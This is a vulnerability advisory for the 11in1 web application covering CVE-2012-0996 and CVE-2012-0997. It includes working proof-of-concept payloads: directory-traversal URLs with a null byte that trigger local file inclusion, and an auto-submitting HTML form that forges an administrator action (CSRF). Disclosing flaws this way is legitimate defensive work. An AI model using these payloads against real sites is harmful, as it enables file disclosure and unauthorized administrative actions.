Advisory Details:

High-Tech Bridge SA Security Research Lab has discovered multiple vulnerabilities in 11in1, which can be exploited to perform Local File Inclusion and Сross-Site Request Forgery (CSRF) attacks.

1) Local File Inclusion in 11in1: CVE-2012-0996

Input passed via the "class" GET parameter to index.php and /admin/index.php is not properly verified before being used to include local files. 
This can be exploited to include local files via directory traversal sequences and URL-encoded NULL bytes.

The following PoC (Proof of Concept) demostrate the vulnerability:

http://[host]/index.php?class=../../../tmp/file%00
http://[host]/admin/index.php?class=../../../tmp/file%00

Successful exploitation of the vulnerabilities requires that "magic_quotes_gpc" is off.

2) Сross-Site Request Forgery (CSRF) in 11in1: CVE-2012-0997

The application allows authorized users to perform certain actions via HTTP requests without making proper validity checks to verify the source of the requests.

An attacker should make logged-in administrator open a malicious link in the browser to exploit this vulnerability.

The following PoC  will create a new topic on behalf of website administrator:


<form action="http://[host]/admin/index.php?class=do&action=addTopic" method="post">
<input type="hidden" name="name" value="New Topic Name here">
<input type="hidden" name="sec" value="3">
<input type="hidden" name="content" value="New Topic Content here">
<input type="submit" id="btn"> 
</form>
<script>
document.getElementById('btn').click();
</script>
